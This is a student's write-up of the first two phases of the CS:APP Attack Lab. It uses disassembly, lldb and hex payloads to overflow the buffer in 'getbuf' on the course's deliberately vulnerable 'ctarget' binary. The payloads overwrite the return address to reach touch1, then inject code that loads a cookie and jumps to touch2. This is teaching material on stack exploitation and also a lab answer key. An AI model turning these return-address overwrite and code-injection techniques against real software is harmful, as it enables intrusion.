# MY ATTACK LAB REPORT

See the `attacklab.pdf` file to understand what am I talking here about.

Note: I took the lab statement from the `yyqian/csapp-labs` github repository because the official CS:APP web page feels kinda bad.

## PHASE 1

The first thing i need to do is to get the disassembled version of `ctarget`.

```bash
attack-lab / % objdump -D ctarget > ctarget_dump.txt
```

Have a look at the dump of `getbuf` function:
```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

You see, that it allocates 0x28 (i.e. 40 in decimal) bytes on the stack and calls `gets`. The main idea is to rewrite the return address of this function from `test` function to `touch1` function. It is pretty easy since the `Gets` function does not check the range of the buffer (I don't really know this because I have not checked it, but it seems obvious) and the function `getbuf` does not have any vulnerability protections such as ASLR or stack canaries. So let's just figure out the `touch1` function address and make a string that will inject the address of the function to the place we need. The beginning of the string we are injecting must be located at the 0x29 address and consist of 8 characters. So, we need to input 40 random characters (let it be `'?'` character idk) and 8 characters of the string we are injecting. The total length of the result string is 48 characters (and hence 48 bytes).

The address of `touch1` function first instruction is `00000000004017c0`. Since this executable is compiled on the little-endian machine, we need to give the `hex2raw` utility the string of `c0 17 40 00 00 00 00 00`.

So, let's write in `solutions/phase1/phase1_bytes.txt` the hex version of our string.
```
3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f c0 17 40 00 00 00 00 00
```
Then, let's convert this byte sequence into a raw string using the `hex2raw` utility and execute the program:
```bash
attack-lab / % ./hex2raw < solutions/phase1/phase1_bytes.txt > solutions/phase1/phase1_raw.txt
attack-lab / % ./ctarget -q -i solutions/phase1/phase1_raw.txt
```

We got this output:
```
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F C0 17 40 00 00 00 00 00
```
It means, that phase 1 is solved correctly.

## PHASE 2

We need to call the `touch2` function with the argument which is given to us in the file `cookie.txt`.
```assembly
movl $0x59b997fa, %edi
call 00000000004017ec
```

Let's have a look at some `movl` tjo `%edi` instruction execution at the dump `ctarget_dump.txt` to figure out how the `movl` to `%edi` instruction is executed:
```assembly
401809:	bf 01 00 00 00       	mov    $0x1,%edi
```

We see, that opcode of that operation is `bf`, the next 4 bytes is the argument to move into `%edi`. Remember that the code was compiled on a little endian machine! So, the instruction we need to inject is:
```
bf fa 97 b9 59
```

We need to inject these instructions onto the stack. But before, we need to replace the return address to the place where the attack code is located. Also, instead of using the `call` instruction (which argument is difficult to calculate), we can use the `ret` instruction. Also we can inject the code right into the stack frame of `getbuf`. To do this, we will need to allocate some place (spoiler: 0x10 bytes) on the stack and 0x8 bytes since the `ret` instruction deallocates 8 bytes from the stack. Also keep in mind, that the stack must be aligned by 16 (0x10). So, in total we need to allocate <multiple of 0x10> + 0x8 bytes on the stack (spoiler: 0x18 bytes). So, we need to do the
```assembly
subq $0x18, %rsp
```
instruction, or
```
48 83 ec 18
```
the opcode is `48 83 ec`, `18` is the argument.

The address of the function `touch2` is `0x00000000004017ec`. So, the return address we need to write is:
```
ec 17 40 00 00 00 00 00
```

The `ret` instruction opcode is `c3`. So, we just need to find the place where to write our "malicious code". Let's go to lldb and find out the `%rsp` value when the `getbuf` funciton called.
```bash
(lldb) breakpoint set --name getbuf
(lldb) run -q -i solutions/phase1/phase1_raw.txt # run with the values from the first task, that's not important
(lldb) register read rsp
```

We see, that the value of `%rsp` is `0x000000005561dc78`, so the return address of the funciton is located at the `0x000000005561dca0` address. Let's write here the value of `0x000000005561dc78`. At the beginning of the stack frame (the beginning of the buffer and the value of `%rsp`) let's write our malicious code:
```
subq $0x18, %rsp       ; 48 83 ec 18
movl $0x59b997fa, %edi ; bf fa 97 b9 59
ret                    ; c3
```

Also we need to fill the malicious code with something before the `ret` instruction. The `nop` instruction (90 opcode) fits there like a glove.

And the answer is:

```
48 83 ec 18 bf fa 97 b9 59 90 90 90 90 90 90 90 90 90 90 90 90 90 90 c3 ec 17 40 00 00 00 00 00 3f 3f 3f 3f 3f 3f 3f 3f 78 dc 61 55 00 00 00 00
```

Trying to execute:
```bash
attack-lab / % ./hex2raw < solutions/phase2/phase2_bytes.txt > solutions/phase2/phase2_raw.txt
attack-lab / % ./ctarget -q -i solutions/phase2/phase2_raw.txt
```

and it works!
```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 83 EC 18 BF FA 97 B9 59 90 90 90 90 90 90 90 90 90 90 90 90 90 90 C3 EC 17 40 00 00 00 00 00 3F 3F 3F 3F 3F 3F 3F 3F 78 DC 61 55 00 00 00 00
```